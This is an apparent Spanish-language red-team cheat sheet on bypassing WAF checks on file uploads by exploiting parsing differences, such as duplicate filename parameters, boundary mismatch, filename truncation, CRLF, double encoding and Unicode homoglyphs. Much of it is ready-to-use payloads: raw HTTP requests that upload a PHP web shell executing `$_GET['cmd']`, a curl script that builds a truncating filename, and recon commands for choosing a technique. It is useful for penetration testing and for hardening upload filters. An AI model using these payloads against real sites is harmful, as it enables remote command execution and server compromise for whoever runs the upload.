---
aliases:
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[File Upload - Vulnerabilidades]]"
---
# File Upload - Bypass por Confusión y Desincronización

---

## Cheatsheet

| **Payload (en Burp/raw HTTP)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Content-Disposition: form-data; name="file"; filename="foto.jpg"; filename="shell.php"` | HPP — WAF lee primero `foto.jpg`, PHP lee último `shell.php` | WAF + PHP backend con parsing inconsistente. |
| `Content-Type: multipart/form-data; boundary=---` (boundary corto) + boundary largo en body | WAF deja de parsear, backend "fixea" y procesa | WAF estricto en multipart. |
| `filename="shell.php.[250×'A'].jpg"` (longitud >255) | OS trunca a 255 chars → guarda como `shell.php` | Filename concat, ext check pasa, OS trunca. |
| `filename="shell.php%0d%0a.jpg"` | CRLF rompe el parsing del header en WAF | WAF strict, backend tolerante. |
| `filename="shell%252ephp"` (doble URL encode de `.`) | WAF decode una vez, backend otra → `shell.php` | Chains de decoders. |
| `filename="shell․php"` (Unicode `.` U+2024 ONE DOT LEADER) | Char homoglifo — visualmente igual, distinto código | WAF blacklist exact-match. |
| `name="file[]"` (array notation en nombre del campo) | WAF crashea / ignora, PHP procesa como array | WAFs simples + PHP. |
| `filename=""` + body con payload | Filename vacío → muchos backends generan nombre random pero guardan body | App con default filename generator. |
| Subir 2 archivos con mismo boundary (uno legit primero, payload segundo) | Algunos parsers procesan solo el primero, otros ambos | Backend usa diferentes libs que parser1. |
| `Content-Type: image/jpeg\r\nContent-Type: application/x-php` | Doble header → WAF lee primero, backend lee último | HTTP parsing differential. |
^fu-confusion

### Ejemplo de HPP en multipart

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---X

---X
Content-Disposition: form-data; name="file"; filename="foto.jpg"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
---X--
```

WAF: ve `filename="foto.jpg"` primero → allow.
PHP `$_FILES`: usa último `filename="shell.php"` → guarda como PHP.

### Truncamiento por longitud

```bash
# Generar filename de 255+ chars
FN="shell.php.$(python3 -c 'print("A"*250)').jpg"
echo ${#FN}  # 263 chars

# OS Linux trunca a 255 caracteres
# El `.jpg` final cae fuera del límite → archivo guardado como shell.php.AAA...A
curl -F "file=@payload;filename=$FN" https://target/upload
```

### Boundary mismatch

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=AAAA

--AAAA
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
--AAAA--
```

WAF intenta parsear con `boundary=AAAA` pero al ver `--AAAA` extra-padded o malformado → falla y abandona. Backend reensembla.

### Workflow recon de stack

```bash
# Identificar backend para elegir técnica
curl -sI https://target/upload | grep -iE 'server|x-powered-by'

# nginx + PHP-FPM → HPP funciona seguro
# IIS + ASP.NET → web.config + null byte legacy
# Tomcat → boundary manipulation + .jsp
# Express/Node → multer parsing quirks
```

---

## Overview

Técnicas que aprovechan **diferencias de parsing** entre componentes (WAF vs backend, proxy vs app, OS vs filter). El WAF "ve" algo diferente de lo que el backend procesa.

**Vectores principales:**
1. **HPP (Parameter Pollution)** — múltiples `filename` en el mismo header.
2. **Boundary manipulation** — romper multipart parsing del WAF, backend tolera.
3. **OS truncation** — exceder 255 chars, OS corta donde quiere atacante.
4. **CRLF/Unicode/encoding** — chars que WAF no normaliza pero backend sí.
5. **Array notation** — `name="file[]"` cambia tipo de variable.

Más efectivo cuanto más distantes los componentes (WAF cloud + backend on-prem = grandes diferencias de parsing).

---
